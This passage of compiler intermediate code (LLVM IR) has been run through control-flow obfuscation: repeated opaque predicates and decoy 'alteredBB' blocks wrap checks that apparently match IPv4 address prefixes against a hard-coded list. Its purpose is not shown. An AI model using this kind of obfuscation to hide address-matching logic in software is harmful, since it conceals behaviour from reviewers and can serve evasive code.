  %4033 = zext i8 %4032 to i32
  %4034 = icmp eq i32 %4033, 104
  %4035 = load i32, i32* @x.57
  %4036 = load i32, i32* @y.58
  %4037 = sub i32 %4035, 1
  %4038 = mul i32 %4035, %4037
  %4039 = urem i32 %4038, 2
  %4040 = icmp eq i32 %4039, 0
  %4041 = icmp slt i32 %4036, 10
  %4042 = or i1 %4040, %4041
  br i1 %4042, label %originalBBpart2572, label %originalBB570alteredBB

originalBBpart2572:                               ; preds = %originalBB570
  br i1 %4034, label %4043, label %4071

; <label>:4043:                                   ; preds = %originalBBpart2572
  %4044 = load i32, i32* @x.57
  %4045 = load i32, i32* @y.58
  %4046 = sub i32 %4044, 1
  %4047 = mul i32 %4044, %4046
  %4048 = urem i32 %4047, 2
  %4049 = icmp eq i32 %4048, 0
  %4050 = icmp slt i32 %4045, 10
  %4051 = or i1 %4049, %4050
  br i1 %4051, label %originalBB574, label %originalBB574alteredBB

originalBB574:                                    ; preds = %originalBB574alteredBB, %4043
  %4052 = load i8, i8* %11, align 1
  %4053 = zext i8 %4052 to i32
  %4054 = icmp eq i32 %4053, 200
  %4055 = load i32, i32* @x.57
  %4056 = load i32, i32* @y.58
  %4057 = sub i32 %4055, 1
  %4058 = mul i32 %4055, %4057
  %4059 = urem i32 %4058, 2
  %4060 = icmp eq i32 %4059, 0
  %4061 = icmp slt i32 %4056, 10
  %4062 = or i1 %4060, %4061
  br i1 %4062, label %originalBBpart2576, label %originalBB574alteredBB

originalBBpart2576:                               ; preds = %originalBB574
  br i1 %4054, label %4063, label %4071

; <label>:4063:                                   ; preds = %originalBBpart2576
  %4064 = load i8, i8* %12, align 1
  %4065 = zext i8 %4064 to i32
  %4066 = icmp sge i32 %4065, 128
  br i1 %4066, label %4067, label %4071

; <label>:4067:                                   ; preds = %4063
  %4068 = load i8, i8* %12, align 1
  %4069 = zext i8 %4068 to i32
  %4070 = icmp slt i32 %4069, 159
  br i1 %4070, label %5259, label %4071

; <label>:4071:                                   ; preds = %4067, %4063, %originalBBpart2576, %originalBBpart2572
  %4072 = load i32, i32* @x.57
  %4073 = load i32, i32* @y.58
  %4074 = sub i32 %4072, 1
  %4075 = mul i32 %4072, %4074
  %4076 = urem i32 %4075, 2
  %4077 = icmp eq i32 %4076, 0
  %4078 = icmp slt i32 %4073, 10
  %4079 = or i1 %4077, %4078
  br i1 %4079, label %originalBB578, label %originalBB578alteredBB

originalBB578:                                    ; preds = %originalBB578alteredBB, %4071
  %4080 = load i8, i8* %10, align 1
  %4081 = zext i8 %4080 to i32
  %4082 = icmp eq i32 %4081, 107
  %4083 = load i32, i32* @x.57
  %4084 = load i32, i32* @y.58
  %4085 = sub i32 %4083, 1
  %4086 = mul i32 %4083, %4085
  %4087 = urem i32 %4086, 2
  %4088 = icmp eq i32 %4087, 0
  %4089 = icmp slt i32 %4084, 10
  %4090 = or i1 %4088, %4089
  br i1 %4090, label %originalBBpart2580, label %originalBB578alteredBB

originalBBpart2580:                               ; preds = %originalBB578
  br i1 %4082, label %4091, label %4103

; <label>:4091:                                   ; preds = %originalBBpart2580
  %4092 = load i8, i8* %11, align 1
  %4093 = zext i8 %4092 to i32
  %4094 = icmp eq i32 %4093, 152
  br i1 %4094, label %4095, label %4103

; <label>:4095:                                   ; preds = %4091
  %4096 = load i8, i8* %12, align 1
  %4097 = zext i8 %4096 to i32
  %4098 = icmp sge i32 %4097, 96
  br i1 %4098, label %4099, label %4103

; <label>:4099:                                   ; preds = %4095
  %4100 = load i8, i8* %12, align 1
  %4101 = zext i8 %4100 to i32
  %4102 = icmp slt i32 %4101, 111
  br i1 %4102, label %5259, label %4103

; <label>:4103:                                   ; preds = %4099, %4095, %4091, %originalBBpart2580
  %4104 = load i8, i8* %10, align 1
  %4105 = zext i8 %4104 to i32
  %4106 = icmp eq i32 %4105, 107
  br i1 %4106, label %4107, label %4135

; <label>:4107:                                   ; preds = %4103
  %4108 = load i32, i32* @x.57
  %4109 = load i32, i32* @y.58
  %4110 = sub i32 %4108, 1
  %4111 = mul i32 %4108, %4110
  %4112 = urem i32 %4111, 2
  %4113 = icmp eq i32 %4112, 0
  %4114 = icmp slt i32 %4109, 10
  %4115 = or i1 %4113, %4114
  br i1 %4115, label %originalBB582, label %originalBB582alteredBB

originalBB582:                                    ; preds = %originalBB582alteredBB, %4107
  %4116 = load i8, i8* %11, align 1
  %4117 = zext i8 %4116 to i32
  %4118 = icmp eq i32 %4117, 181
  %4119 = load i32, i32* @x.57
  %4120 = load i32, i32* @y.58
  %4121 = sub i32 %4119, 1
  %4122 = mul i32 %4119, %4121
  %4123 = urem i32 %4122, 2
  %4124 = icmp eq i32 %4123, 0
  %4125 = icmp slt i32 %4120, 10
  %4126 = or i1 %4124, %4125
  br i1 %4126, label %originalBBpart2584, label %originalBB582alteredBB

originalBBpart2584:                               ; preds = %originalBB582
  br i1 %4118, label %4127, label %4135

; <label>:4127:                                   ; preds = %originalBBpart2584
  %4128 = load i8, i8* %12, align 1
  %4129 = zext i8 %4128 to i32
  %4130 = icmp sge i32 %4129, 160
  br i1 %4130, label %4131, label %4135

; <label>:4131:                                   ; preds = %4127
  %4132 = load i8, i8* %12, align 1
  %4133 = zext i8 %4132 to i32
  %4134 = icmp slt i32 %4133, 189
  br i1 %4134, label %5259, label %4135

; <label>:4135:                                   ; preds = %4131, %4127, %originalBBpart2584, %4103
  %4136 = load i8, i8* %10, align 1
  %4137 = zext i8 %4136 to i32
  %4138 = icmp eq i32 %4137, 172
  br i1 %4138, label %4139, label %4151

; <label>:4139:                                   ; preds = %4135
  %4140 = load i8, i8* %11, align 1
  %4141 = zext i8 %4140 to i32
  %4142 = icmp eq i32 %4141, 98
  br i1 %4142, label %4143, label %4151

; <label>:4143:                                   ; preds = %4139
  %4144 = load i8, i8* %12, align 1
  %4145 = zext i8 %4144 to i32
  %4146 = icmp sge i32 %4145, 64
  br i1 %4146, label %4147, label %4151

; <label>:4147:                                   ; preds = %4143
  %4148 = load i8, i8* %12, align 1
  %4149 = zext i8 %4148 to i32
  %4150 = icmp slt i32 %4149, 95
  br i1 %4150, label %5259, label %4151

; <label>:4151:                                   ; preds = %4147, %4143, %4139, %4135
  %4152 = load i8, i8* %10, align 1
  %4153 = zext i8 %4152 to i32
  %4154 = icmp eq i32 %4153, 184
  br i1 %4154, label %4155, label %4167

; <label>:4155:                                   ; preds = %4151
  %4156 = load i8, i8* %11, align 1
  %4157 = zext i8 %4156 to i32
  %4158 = icmp eq i32 %4157, 170
  br i1 %4158, label %4159, label %4167

; <label>:4159:                                   ; preds = %4155
  %4160 = load i8, i8* %12, align 1
  %4161 = zext i8 %4160 to i32
  %4162 = icmp sge i32 %4161, 240
  br i1 %4162, label %4163, label %4167

; <label>:4163:                                   ; preds = %4159
  %4164 = load i8, i8* %12, align 1
  %4165 = zext i8 %4164 to i32
  %4166 = icmp slt i32 %4165, 255
  br i1 %4166, label %5259, label %4167

; <label>:4167:                                   ; preds = %4163, %4159, %4155, %4151
  %4168 = load i8, i8* %10, align 1
  %4169 = zext i8 %4168 to i32
  %4170 = icmp eq i32 %4169, 192
  br i1 %4170, label %4171, label %4199

; <label>:4171:                                   ; preds = %4167
  %4172 = load i8, i8* %11, align 1
  %4173 = zext i8 %4172 to i32
  %4174 = icmp eq i32 %4173, 111
  br i1 %4174, label %4175, label %4199

; <label>:4175:                                   ; preds = %4171
  %4176 = load i8, i8* %12, align 1
  %4177 = zext i8 %4176 to i32
  %4178 = icmp sge i32 %4177, 128
  br i1 %4178, label %4179, label %4199

; <label>:4179:                                   ; preds = %4175
  %4180 = load i32, i32* @x.57
  %4181 = load i32, i32* @y.58
  %4182 = sub i32 %4180, 1
  %4183 = mul i32 %4180, %4182
  %4184 = urem i32 %4183, 2
  %4185 = icmp eq i32 %4184, 0
  %4186 = icmp slt i32 %4181, 10
  %4187 = or i1 %4185, %4186
  br i1 %4187, label %originalBB586, label %originalBB586alteredBB

originalBB586:                                    ; preds = %originalBB586alteredBB, %4179
  %4188 = load i8, i8* %12, align 1
  %4189 = zext i8 %4188 to i32
  %4190 = icmp slt i32 %4189, 143
  %4191 = load i32, i32* @x.57
  %4192 = load i32, i32* @y.58
  %4193 = sub i32 %4191, 1
  %4194 = mul i32 %4191, %4193
  %4195 = urem i32 %4194, 2
  %4196 = icmp eq i32 %4195, 0
  %4197 = icmp slt i32 %4192, 10
  %4198 = or i1 %4196, %4197
  br i1 %4198, label %originalBBpart2588, label %originalBB586alteredBB

originalBBpart2588:                               ; preds = %originalBB586
  br i1 %4190, label %5259, label %4199

; <label>:4199:                                   ; preds = %originalBBpart2588, %4175, %4171, %4167
  %4200 = load i32, i32* @x.57
  %4201 = load i32, i32* @y.58
  %4202 = sub i32 %4200, 1
  %4203 = mul i32 %4200, %4202
  %4204 = urem i32 %4203, 2
  %4205 = icmp eq i32 %4204, 0
  %4206 = icmp slt i32 %4201, 10
  %4207 = or i1 %4205, %4206
  br i1 %4207, label %originalBB590, label %originalBB590alteredBB

originalBB590:                                    ; preds = %originalBB590alteredBB, %4199
  %4208 = load i8, i8* %10, align 1
  %4209 = zext i8 %4208 to i32
  %4210 = icmp eq i32 %4209, 192
  %4211 = load i32, i32* @x.57
  %4212 = load i32, i32* @y.58
  %4213 = sub i32 %4211, 1
  %4214 = mul i32 %4211, %4213
  %4215 = urem i32 %4214, 2
  %4216 = icmp eq i32 %4215, 0
  %4217 = icmp slt i32 %4212, 10
  %4218 = or i1 %4216, %4217
  br i1 %4218, label %originalBBpart2592, label %originalBB590alteredBB

originalBBpart2592:                               ; preds = %originalBB590
  br i1 %4210, label %4219, label %4263

; <label>:4219:                                   ; preds = %originalBBpart2592
  %4220 = load i32, i32* @x.57
  %4221 = load i32, i32* @y.58
  %4222 = sub i32 %4220, 1
  %4223 = mul i32 %4220, %4222
  %4224 = urem i32 %4223, 2
  %4225 = icmp eq i32 %4224, 0
  %4226 = icmp slt i32 %4221, 10
  %4227 = or i1 %4225, %4226
  br i1 %4227, label %originalBB594, label %originalBB594alteredBB

originalBB594:                                    ; preds = %originalBB594alteredBB, %4219
  %4228 = load i8, i8* %11, align 1
  %4229 = zext i8 %4228 to i32
  %4230 = icmp eq i32 %4229, 252
  %4231 = load i32, i32* @x.57
  %4232 = load i32, i32* @y.58
  %4233 = sub i32 %4231, 1
  %4234 = mul i32 %4231, %4233
  %4235 = urem i32 %4234, 2
  %4236 = icmp eq i32 %4235, 0
  %4237 = icmp slt i32 %4232, 10
  %4238 = or i1 %4236, %4237
  br i1 %4238, label %originalBBpart2596, label %originalBB594alteredBB

originalBBpart2596:                               ; preds = %originalBB594
  br i1 %4230, label %4239, label %4263

; <label>:4239:                                   ; preds = %originalBBpart2596
  %4240 = load i32, i32* @x.57
  %4241 = load i32, i32* @y.58
  %4242 = sub i32 %4240, 1
  %4243 = mul i32 %4240, %4242
  %4244 = urem i32 %4243, 2
  %4245 = icmp eq i32 %4244, 0
  %4246 = icmp slt i32 %4241, 10
  %4247 = or i1 %4245, %4246
  br i1 %4247, label %originalBB598, label %originalBB598alteredBB

originalBB598:                                    ; preds = %originalBB598alteredBB, %4239
  %4248 = load i8, i8* %12, align 1
  %4249 = zext i8 %4248 to i32
  %4250 = icmp sge i32 %4249, 208
  %4251 = load i32, i32* @x.57
  %4252 = load i32, i32* @y.58
  %4253 = sub i32 %4251, 1
  %4254 = mul i32 %4251, %4253
  %4255 = urem i32 %4254, 2
  %4256 = icmp eq i32 %4255, 0
  %4257 = icmp slt i32 %4252, 10
  %4258 = or i1 %4256, %4257
  br i1 %4258, label %originalBBpart2600, label %originalBB598alteredBB

originalBBpart2600:                               ; preds = %originalBB598
  br i1 %4250, label %4259, label %4263

; <label>:4259:                                   ; preds = %originalBBpart2600
  %4260 = load i8, i8* %12, align 1
  %4261 = zext i8 %4260 to i32
  %4262 = icmp slt i32 %4261, 223
  br i1 %4262, label %5259, label %4263

; <label>:4263:                                   ; preds = %4259, %originalBBpart2600, %originalBBpart2596, %originalBBpart2592
  %4264 = load i8, i8* %10, align 1
  %4265 = zext i8 %4264 to i32
  %4266 = icmp eq i32 %4265, 192
  br i1 %4266, label %4267, label %4295

; <label>:4267:                                   ; preds = %4263
  %4268 = load i8, i8* %11, align 1
  %4269 = zext i8 %4268 to i32
  %4270 = icmp eq i32 %4269, 40
  br i1 %4270, label %4271, label %4295

; <label>:4271:                                   ; preds = %4267
  %4272 = load i8, i8* %12, align 1
  %4273 = zext i8 %4272 to i32
  %4274 = icmp sge i32 %4273, 56
  br i1 %4274, label %4275, label %4295

; <label>:4275:                                   ; preds = %4271
  %4276 = load i32, i32* @x.57
  %4277 = load i32, i32* @y.58
  %4278 = sub i32 %4276, 1
  %4279 = mul i32 %4276, %4278
  %4280 = urem i32 %4279, 2
  %4281 = icmp eq i32 %4280, 0
  %4282 = icmp slt i32 %4277, 10
  %4283 = or i1 %4281, %4282
  br i1 %4283, label %originalBB602, label %originalBB602alteredBB

originalBB602:                                    ; preds = %originalBB602alteredBB, %4275
  %4284 = load i8, i8* %12, align 1
  %4285 = zext i8 %4284 to i32
  %4286 = icmp slt i32 %4285, 59
  %4287 = load i32, i32* @x.57
  %4288 = load i32, i32* @y.58
  %4289 = sub i32 %4287, 1
  %4290 = mul i32 %4287, %4289
  %4291 = urem i32 %4290, 2
  %4292 = icmp eq i32 %4291, 0
  %4293 = icmp slt i32 %4288, 10
  %4294 = or i1 %4292, %4293
  br i1 %4294, label %originalBBpart2604, label %originalBB602alteredBB

originalBBpart2604:                               ; preds = %originalBB602
  br i1 %4286, label %5259, label %4295

; <label>:4295:                                   ; preds = %originalBBpart2604, %4271, %4267, %4263
  %4296 = load i8, i8* %10, align 1
  %4297 = zext i8 %4296 to i32
  %4298 = icmp eq i32 %4297, 198
  br i1 %4298, label %4299, label %4343

; <label>:4299:                                   ; preds = %4295
  %4300 = load i32, i32* @x.57
  %4301 = load i32, i32* @y.58
  %4302 = sub i32 %4300, 1
  %4303 = mul i32 %4300, %4302
  %4304 = urem i32 %4303, 2
  %4305 = icmp eq i32 %4304, 0
  %4306 = icmp slt i32 %4301, 10
  %4307 = or i1 %4305, %4306
  br i1 %4307, label %originalBB606, label %originalBB606alteredBB

originalBB606:                                    ; preds = %originalBB606alteredBB, %4299
  %4308 = load i8, i8* %11, align 1
  %4309 = zext i8 %4308 to i32
  %4310 = icmp eq i32 %4309, 8
  %4311 = load i32, i32* @x.57
  %4312 = load i32, i32* @y.58
  %4313 = sub i32 %4311, 1
  %4314 = mul i32 %4311, %4313
  %4315 = urem i32 %4314, 2
  %4316 = icmp eq i32 %4315, 0
  %4317 = icmp slt i32 %4312, 10
  %4318 = or i1 %4316, %4317
  br i1 %4318, label %originalBBpart2608, label %originalBB606alteredBB

originalBBpart2608:                               ; preds = %originalBB606
  br i1 %4310, label %4319, label %4343

; <label>:4319:                                   ; preds = %originalBBpart2608
  %4320 = load i8, i8* %12, align 1
  %4321 = zext i8 %4320 to i32
  %4322 = icmp sge i32 %4321, 81
  br i1 %4322, label %4323, label %4343

; <label>:4323:                                   ; preds = %4319
  %4324 = load i32, i32* @x.57
  %4325 = load i32, i32* @y.58
  %4326 = sub i32 %4324, 1
  %4327 = mul i32 %4324, %4326
  %4328 = urem i32 %4327, 2
  %4329 = icmp eq i32 %4328, 0
  %4330 = icmp slt i32 %4325, 10
  %4331 = or i1 %4329, %4330
  br i1 %4331, label %originalBB610, label %originalBB610alteredBB

originalBB610:                                    ; preds = %originalBB610alteredBB, %4323
  %4332 = load i8, i8* %12, align 1
  %4333 = zext i8 %4332 to i32
  %4334 = icmp slt i32 %4333, 95
  %4335 = load i32, i32* @x.57
  %4336 = load i32, i32* @y.58
  %4337 = sub i32 %4335, 1
  %4338 = mul i32 %4335, %4337
  %4339 = urem i32 %4338, 2
  %4340 = icmp eq i32 %4339, 0
  %4341 = icmp slt i32 %4336, 10
  %4342 = or i1 %4340, %4341
  br i1 %4342, label %originalBBpart2612, label %originalBB610alteredBB

originalBBpart2612:                               ; preds = %originalBB610
  br i1 %4334, label %5259, label %4343

; <label>:4343:                                   ; preds = %originalBBpart2612, %4319, %originalBBpart2608, %4295
  %4344 = load i8, i8* %10, align 1
  %4345 = zext i8 %4344 to i32
  %4346 = icmp eq i32 %4345, 199
  br i1 %4346, label %4347, label %4375

; <label>:4347:                                   ; preds = %4343
  %4348 = load i8, i8* %11, align 1
  %4349 = zext i8 %4348 to i32
  %4350 = icmp eq i32 %4349, 116
  br i1 %4350, label %4351, label %4375

; <label>:4351:                                   ; preds = %4347
  %4352 = load i8, i8* %12, align 1
  %4353 = zext i8 %4352 to i32
  %4354 = icmp sge i32 %4353, 112
  br i1 %4354, label %4355, label %4375

; <label>:4355:                                   ; preds = %4351
  %4356 = load i32, i32* @x.57
  %4357 = load i32, i32* @y.58
  %4358 = sub i32 %4356, 1
  %4359 = mul i32 %4356, %4358
  %4360 = urem i32 %4359, 2
  %4361 = icmp eq i32 %4360, 0
  %4362 = icmp slt i32 %4357, 10
  %4363 = or i1 %4361, %4362
  br i1 %4363, label %originalBB614, label %originalBB614alteredBB

originalBB614:                                    ; preds = %originalBB614alteredBB, %4355
  %4364 = load i8, i8* %12, align 1
  %4365 = zext i8 %4364 to i32
  %4366 = icmp slt i32 %4365, 119
  %4367 = load i32, i32* @x.57
  %4368 = load i32, i32* @y.58
  %4369 = sub i32 %4367, 1
  %4370 = mul i32 %4367, %4369
  %4371 = urem i32 %4370, 2
  %4372 = icmp eq i32 %4371, 0
  %4373 = icmp slt i32 %4368, 10
  %4374 = or i1 %4372, %4373
  br i1 %4374, label %originalBBpart2616, label %originalBB614alteredBB

originalBBpart2616:                               ; preds = %originalBB614
  br i1 %4366, label %5259, label %4375

; <label>:4375:                                   ; preds = %originalBBpart2616, %4351, %4347, %4343
  %4376 = load i8, i8* %10, align 1
  %4377 = zext i8 %4376 to i32
  %4378 = icmp eq i32 %4377, 199
  br i1 %4378, label %4379, label %4407

; <label>:4379:                                   ; preds = %4375
  %4380 = load i32, i32* @x.57
  %4381 = load i32, i32* @y.58
  %4382 = sub i32 %4380, 1
  %4383 = mul i32 %4380, %4382
  %4384 = urem i32 %4383, 2
  %4385 = icmp eq i32 %4384, 0
  %4386 = icmp slt i32 %4381, 10
  %4387 = or i1 %4385, %4386
  br i1 %4387, label %originalBB618, label %originalBB618alteredBB

originalBB618:                                    ; preds = %originalBB618alteredBB, %4379
  %4388 = load i8, i8* %11, align 1
  %4389 = zext i8 %4388 to i32
  %4390 = icmp eq i32 %4389, 229
  %4391 = load i32, i32* @x.57
  %4392 = load i32, i32* @y.58
  %4393 = sub i32 %4391, 1
  %4394 = mul i32 %4391, %4393
  %4395 = urem i32 %4394, 2
  %4396 = icmp eq i32 %4395, 0
  %4397 = icmp slt i32 %4392, 10
  %4398 = or i1 %4396, %4397
  br i1 %4398, label %originalBBpart2620, label %originalBB618alteredBB

originalBBpart2620:                               ; preds = %originalBB618
  br i1 %4390, label %4399, label %4407

; <label>:4399:                                   ; preds = %originalBBpart2620
  %4400 = load i8, i8* %12, align 1
  %4401 = zext i8 %4400 to i32
  %4402 = icmp sge i32 %4401, 248
  br i1 %4402, label %4403, label %4407

; <label>:4403:                                   ; preds = %4399
  %4404 = load i8, i8* %12, align 1
  %4405 = zext i8 %4404 to i32
  %4406 = icmp slt i32 %4405, 255
  br i1 %4406, label %5259, label %4407

; <label>:4407:                                   ; preds = %4403, %4399, %originalBBpart2620, %4375
  %4408 = load i8, i8* %10, align 1
  %4409 = zext i8 %4408 to i32
  %4410 = icmp eq i32 %4409, 199
  br i1 %4410, label %4411, label %4423

; <label>:4411:                                   ; preds = %4407
  %4412 = load i8, i8* %11, align 1
  %4413 = zext i8 %4412 to i32
  %4414 = icmp eq i32 %4413, 36
  br i1 %4414, label %4415, label %4423

; <label>:4415:                                   ; preds = %4411
  %4416 = load i8, i8* %12, align 1
  %4417 = zext i8 %4416 to i32
  %4418 = icmp sge i32 %4417, 220
  br i1 %4418, label %4419, label %4423

; <label>:4419:                                   ; preds = %4415
  %4420 = load i8, i8* %12, align 1
  %4421 = zext i8 %4420 to i32
  %4422 = icmp slt i32 %4421, 223
  br i1 %4422, label %5259, label %4423

; <label>:4423:                                   ; preds = %4419, %4415, %4411, %4407
  %4424 = load i8, i8* %10, align 1
  %4425 = zext i8 %4424 to i32
  %4426 = icmp eq i32 %4425, 199
  br i1 %4426, label %4427, label %4471

; <label>:4427:                                   ; preds = %4423
  %4428 = load i8, i8* %11, align 1
  %4429 = zext i8 %4428 to i32
  %4430 = icmp eq i32 %4429, 58
  br i1 %4430, label %4431, label %4471

; <label>:4431:                                   ; preds = %4427
  %4432 = load i32, i32* @x.57
  %4433 = load i32, i32* @y.58
  %4434 = sub i32 %4432, 1
  %4435 = mul i32 %4432, %4434
  %4436 = urem i32 %4435, 2
  %4437 = icmp eq i32 %4436, 0
  %4438 = icmp slt i32 %4433, 10
  %4439 = or i1 %4437, %4438
  br i1 %4439, label %originalBB622, label %originalBB622alteredBB

originalBB622:                                    ; preds = %originalBB622alteredBB, %4431
  %4440 = load i8, i8* %12, align 1
  %4441 = zext i8 %4440 to i32
  %4442 = icmp sge i32 %4441, 184
  %4443 = load i32, i32* @x.57
  %4444 = load i32, i32* @y.58
  %4445 = sub i32 %4443, 1
  %4446 = mul i32 %4443, %4445
  %4447 = urem i32 %4446, 2
  %4448 = icmp eq i32 %4447, 0
  %4449 = icmp slt i32 %4444, 10
  %4450 = or i1 %4448, %4449
  br i1 %4450, label %originalBBpart2624, label %originalBB622alteredBB

originalBBpart2624:                               ; preds = %originalBB622
  br i1 %4442, label %4451, label %4471

; <label>:4451:                                   ; preds = %originalBBpart2624
  %4452 = load i32, i32* @x.57
  %4453 = load i32, i32* @y.58
  %4454 = sub i32 %4452, 1
  %4455 = mul i32 %4452, %4454
  %4456 = urem i32 %4455, 2
  %4457 = icmp eq i32 %4456, 0
  %4458 = icmp slt i32 %4453, 10
  %4459 = or i1 %4457, %4458
  br i1 %4459, label %originalBB626, label %originalBB626alteredBB

originalBB626:                                    ; preds = %originalBB626alteredBB, %4451
  %4460 = load i8, i8* %12, align 1
  %4461 = zext i8 %4460 to i32
  %4462 = icmp slt i32 %4461, 187
  %4463 = load i32, i32* @x.57
  %4464 = load i32, i32* @y.58
  %4465 = sub i32 %4463, 1
  %4466 = mul i32 %4463, %4465
  %4467 = urem i32 %4466, 2
  %4468 = icmp eq i32 %4467, 0
  %4469 = icmp slt i32 %4464, 10
  %4470 = or i1 %4468, %4469
  br i1 %4470, label %originalBBpart2628, label %originalBB626alteredBB

originalBBpart2628:                               ; preds = %originalBB626
  br i1 %4462, label %5259, label %4471

; <label>:4471:                                   ; preds = %originalBBpart2628, %originalBBpart2624, %4427, %4423
  %4472 = load i8, i8* %10, align 1
  %4473 = zext i8 %4472 to i32
  %4474 = icmp eq i32 %4473, 206
  br i1 %4474, label %4475, label %4487

; <label>:4475:                                   ; preds = %4471
  %4476 = load i8, i8* %11, align 1
  %4477 = zext i8 %4476 to i32
  %4478 = icmp eq i32 %4477, 220
  br i1 %4478, label %4479, label %4487

; <label>:4479:                                   ; preds = %4475
  %4480 = load i8, i8* %12, align 1
  %4481 = zext i8 %4480 to i32
  %4482 = icmp sge i32 %4481, 172
  br i1 %4482, label %4483, label %4487

; <label>:4483:                                   ; preds = %4479
  %4484 = load i8, i8* %12, align 1
  %4485 = zext i8 %4484 to i32
  %4486 = icmp slt i32 %4485, 175
  br i1 %4486, label %5259, label %4487

; <label>:4487:                                   ; preds = %4483, %4479, %4475, %4471
  %4488 = load i8, i8* %10, align 1
  %4489 = zext i8 %4488 to i32
  %4490 = icmp eq i32 %4489, 208
  br i1 %4490, label %4491, label %4519

; <label>:4491:                                   ; preds = %4487
  %4492 = load i32, i32* @x.57
  %4493 = load i32, i32* @y.58
  %4494 = sub i32 %4492, 1
  %4495 = mul i32 %4492, %4494
  %4496 = urem i32 %4495, 2
  %4497 = icmp eq i32 %4496, 0
  %4498 = icmp slt i32 %4493, 10
  %4499 = or i1 %4497, %4498
  br i1 %4499, label %originalBB630, label %originalBB630alteredBB

originalBB630:                                    ; preds = %originalBB630alteredBB, %4491
  %4500 = load i8, i8* %11, align 1
  %4501 = zext i8 %4500 to i32
  %4502 = icmp eq i32 %4501, 78
  %4503 = load i32, i32* @x.57
  %4504 = load i32, i32* @y.58
  %4505 = sub i32 %4503, 1
  %4506 = mul i32 %4503, %4505
  %4507 = urem i32 %4506, 2
  %4508 = icmp eq i32 %4507, 0
  %4509 = icmp slt i32 %4504, 10
  %4510 = or i1 %4508, %4509
  br i1 %4510, label %originalBBpart2632, label %originalBB630alteredBB

originalBBpart2632:                               ; preds = %originalBB630
  br i1 %4502, label %4511, label %4519

; <label>:4511:                                   ; preds = %originalBBpart2632
  %4512 = load i8, i8* %12, align 1
  %4513 = zext i8 %4512 to i32
  %4514 = icmp sge i32 %4513, 40
  br i1 %4514, label %4515, label %4519

; <label>:4515:                                   ; preds = %4511
  %4516 = load i8, i8* %12, align 1
  %4517 = zext i8 %4516 to i32
  %4518 = icmp slt i32 %4517, 43
  br i1 %4518, label %5259, label %4519

; <label>:4519:                                   ; preds = %4515, %4511, %originalBBpart2632, %4487
  %4520 = load i8, i8* %10, align 1
  %4521 = zext i8 %4520 to i32
  %4522 = icmp eq i32 %4521, 208
  br i1 %4522, label %4523, label %4535

; <label>:4523:                                   ; preds = %4519
  %4524 = load i8, i8* %11, align 1
  %4525 = zext i8 %4524 to i32
  %4526 = icmp eq i32 %4525, 93
  br i1 %4526, label %4527, label %4535

; <label>:4527:                                   ; preds = %4523
  %4528 = load i8, i8* %12, align 1
  %4529 = zext i8 %4528 to i32
  %4530 = icmp sge i32 %4529, 192
  br i1 %4530, label %4531, label %4535

; <label>:4531:                                   ; preds = %4527
  %4532 = load i8, i8* %12, align 1
  %4533 = zext i8 %4532 to i32
  %4534 = icmp slt i32 %4533, 193
  br i1 %4534, label %5259, label %4535

; <label>:4535:                                   ; preds = %4531, %4527, %4523, %4519
  %4536 = load i8, i8* %10, align 1
  %4537 = zext i8 %4536 to i32
  %4538 = icmp eq i32 %4537, 66
  br i1 %4538, label %4539, label %4583

; <label>:4539:                                   ; preds = %4535
  %4540 = load i32, i32* @x.57
  %4541 = load i32, i32* @y.58
  %4542 = sub i32 %4540, 1
  %4543 = mul i32 %4540, %4542
  %4544 = urem i32 %4543, 2
  %4545 = icmp eq i32 %4544, 0
  %4546 = icmp slt i32 %4541, 10
  %4547 = or i1 %4545, %4546
  br i1 %4547, label %originalBB634, label %originalBB634alteredBB

originalBB634:                                    ; preds = %originalBB634alteredBB, %4539
  %4548 = load i8, i8* %11, align 1
  %4549 = zext i8 %4548 to i32
  %4550 = icmp eq i32 %4549, 71
  %4551 = load i32, i32* @x.57
  %4552 = load i32, i32* @y.58
  %4553 = sub i32 %4551, 1
  %4554 = mul i32 %4551, %4553
  %4555 = urem i32 %4554, 2
  %4556 = icmp eq i32 %4555, 0
  %4557 = icmp slt i32 %4552, 10
  %4558 = or i1 %4556, %4557
  br i1 %4558, label %originalBBpart2636, label %originalBB634alteredBB

originalBBpart2636:                               ; preds = %originalBB634
  br i1 %4550, label %4559, label %4583

; <label>:4559:                                   ; preds = %originalBBpart2636
  %4560 = load i8, i8* %12, align 1
  %4561 = zext i8 %4560 to i32
  %4562 = icmp sge i32 %4561, 240
  br i1 %4562, label %4563, label %4583

; <label>:4563:                                   ; preds = %4559
  %4564 = load i32, i32* @x.57
  %4565 = load i32, i32* @y.58
  %4566 = sub i32 %4564, 1
  %4567 = mul i32 %4564, %4566
  %4568 = urem i32 %4567, 2
  %4569 = icmp eq i32 %4568, 0
  %4570 = icmp slt i32 %4565, 10
  %4571 = or i1 %4569, %4570
  br i1 %4571, label %originalBB638, label %originalBB638alteredBB

originalBB638:                                    ; preds = %originalBB638alteredBB, %4563
  %4572 = load i8, i8* %12, align 1
  %4573 = zext i8 %4572 to i32
  %4574 = icmp slt i32 %4573, 255
  %4575 = load i32, i32* @x.57
  %4576 = load i32, i32* @y.58
  %4577 = sub i32 %4575, 1
  %4578 = mul i32 %4575, %4577
  %4579 = urem i32 %4578, 2
  %4580 = icmp eq i32 %4579, 0
  %4581 = icmp slt i32 %4576, 10
  %4582 = or i1 %4580, %4581
  br i1 %4582, label %originalBBpart2640, label %originalBB638alteredBB

originalBBpart2640:                               ; preds = %originalBB638
  br i1 %4574, label %5259, label %4583

; <label>:4583:                                   ; preds = %originalBBpart2640, %4559, %originalBBpart2636, %4535
  %4584 = load i8, i8* %10, align 1
  %4585 = zext i8 %4584 to i32
  %4586 = icmp eq i32 %4585, 98
  br i1 %4586, label %4587, label %4631

; <label>:4587:                                   ; preds = %4583
  %4588 = load i32, i32* @x.57
  %4589 = load i32, i32* @y.58
  %4590 = sub i32 %4588, 1
  %4591 = mul i32 %4588, %4590
  %4592 = urem i32 %4591, 2
  %4593 = icmp eq i32 %4592, 0
  %4594 = icmp slt i32 %4589, 10
  %4595 = or i1 %4593, %4594
  br i1 %4595, label %originalBB642, label %originalBB642alteredBB

originalBB642:                                    ; preds = %originalBB642alteredBB, %4587
  %4596 = load i8, i8* %11, align 1
  %4597 = zext i8 %4596 to i32
  %4598 = icmp eq i32 %4597, 142
  %4599 = load i32, i32* @x.57
  %4600 = load i32, i32* @y.58
  %4601 = sub i32 %4599, 1
  %4602 = mul i32 %4599, %4601
  %4603 = urem i32 %4602, 2
  %4604 = icmp eq i32 %4603, 0
  %4605 = icmp slt i32 %4600, 10
  %4606 = or i1 %4604, %4605
  br i1 %4606, label %originalBBpart2644, label %originalBB642alteredBB

originalBBpart2644:                               ; preds = %originalBB642
